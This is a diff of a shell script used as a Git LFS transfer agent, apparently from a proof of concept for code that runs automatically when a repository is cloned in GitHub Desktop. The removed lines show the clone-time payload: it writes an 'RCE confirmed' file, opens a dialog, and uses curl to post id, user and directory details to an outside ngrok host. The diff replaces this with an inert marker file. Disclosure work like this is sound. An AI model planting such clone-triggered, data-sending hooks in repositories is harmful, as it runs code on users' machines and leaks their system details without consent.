@@ -1,36 +1,7 @@
 #!/bin/sh
 set -eu
 
-proof_file="/tmp/GitHub-Desktop-Clone-RCE-Proof.txt"
-once_dir="/tmp/GitHub-Desktop-Clone-RCE-Proof.once"
-
-if mkdir "$once_dir" 2>/dev/null; then
-  {
-    printf 'GITHUB DESKTOP CLONE RCE CONFIRMED\n\n'
-    printf 'Repository-controlled code executed automatically during Clone.\n\n'
-    printf 'Time: %s\n' "$(date -u '+%Y-%m-%dT%H:%M:%SZ')"
-    printf 'User: %s\n' "$(id -un)"
-    printf 'Working directory: %s\n' "$PWD"
-    printf 'Git LFS: %s\n' "$(git lfs version 2>&1)"
-    printf '\nNo command was run after clicking Clone.\n'
-  } > "$proof_file"
-  osascript -e 'set m to read POSIX file "/tmp/GitHub-Desktop-Clone-RCE-Proof.txt"' \
-    -e 'display dialog m with title "GitHub Desktop Clone RCE" buttons {"OK"} default button "OK"' \
-    >/dev/null 2>&1 &
-fi
-
-evidence=$(printf '%s\n' \
-  'probe=github-desktop-one-click-clone-rce-video' \
-  "time=$(date -u '+%Y-%m-%dT%H:%M:%SZ')" \
-  "id=$(id)" \
-  "pwd=$PWD" \
-  "git_lfs_version=$(git lfs version 2>&1)")
-
-curl -fsS \
-  -H 'content-type: text/plain' \
-  --data-binary "$evidence" \
-  'https://43ea-2601-644-8580-b120-9d34-a9b7-3456-5eb.ngrok-free.app/executed' \
-  >/dev/null 2>&1 || true
+printf 'INERT_PR_PROTOCOL_EXECUTED_20260804\n' > ./pr-protocol-inert.marker
 
 while IFS= read -r message; do
   case "$message" in
@@ -38,7 +9,7 @@ while IFS= read -r message; do
       printf '{"event":"init"}\n'
       ;;
     *'"event":"download"'*)
-      object_path="/tmp/github-desktop-video-lfs-object-$$"
+      object_path="/tmp/codex-ghd-pr-protocol-object-$$"
       printf 'Z' > "$object_path"
       printf '{"event":"complete","oid":"bbeebd879e1dff6918546dc0c179fdde505f2a21591c9a9c96e36b054ec5af83","path":"%s"}\n' "$object_path"
       ;;
